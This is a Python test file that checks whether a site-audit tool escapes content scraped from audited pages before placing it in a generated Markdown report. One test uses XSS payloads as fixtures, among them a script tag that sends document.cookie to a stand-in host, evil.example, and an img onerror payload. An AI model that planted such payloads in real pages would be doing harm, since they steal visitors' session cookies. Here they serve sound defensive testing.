"""Section 4.4: content extracted from a (possibly malicious/compromised)
audited site must never reach the generated report unescaped - a naive
Markdown-to-HTML renderer in the eventual frontend could otherwise execute
a <script> payload that was sitting on the target page's title or text.
"""
from app.models import Confidence, CrawledPage, Finding, PageType, Platform, PlatformDetectionResult, Severity, SiteMap
from app.report import generate_markdown_report
from app.security.sanitize import sanitize_for_report


def test_sanitize_escapes_script_tags():
    result = sanitize_for_report('<script>alert("xss")</script>')
    assert "<script>" not in result
    assert "&lt;script&gt;" in result


def test_sanitize_strips_control_characters():
    result = sanitize_for_report("hello\x00world\x07")
    assert "\x00" not in result
    assert "\x07" not in result
    assert "helloworld" in result


def test_sanitize_truncates_overlong_text():
    result = sanitize_for_report("a" * 5000, max_length=100)
    assert len(result) <= 120
    assert result.endswith("[truncated]")


def test_sanitize_handles_none_and_empty():
    assert sanitize_for_report(None) == ""
    assert sanitize_for_report("") == ""


def test_report_escapes_malicious_finding_title_and_evidence():
    malicious_title = '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
    malicious_evidence = '<img src=x onerror="alert(1)">'

    finding = Finding(
        check_id="llm_editorial_quality",
        title=malicious_title,
        severity=Severity.MEDIUM,
        confidence=Confidence.CONFIRMED,
        page_url="https://shop.example/",
        evidence=malicious_evidence,
    )
    page = CrawledPage(url="https://shop.example/", page_type=PageType.HOMEPAGE, depth=0, reachable=True, title="<b>hi</b>")
    site_map = SiteMap(base_url="https://shop.example/", pages=[page])
    platform = PlatformDetectionResult(platform=Platform.UNKNOWN, base_url="https://shop.example/", evidence=[])

    report = generate_markdown_report(platform, site_map, [finding])

    # The security property: no literal tag delimiters survive, so a naive
    # Markdown-to-HTML renderer can never reconstitute an actual <script>/
    # <img onerror=...> element. Plain text like "onerror=" surviving as
    # inert escaped text is fine - it's no longer inside real tag structure.
    assert "<script>" not in report
    assert "<img" not in report
    assert "<b>hi</b>" not in report
    assert "&lt;script&gt;" in report
    assert "&lt;img src=x onerror=" in report
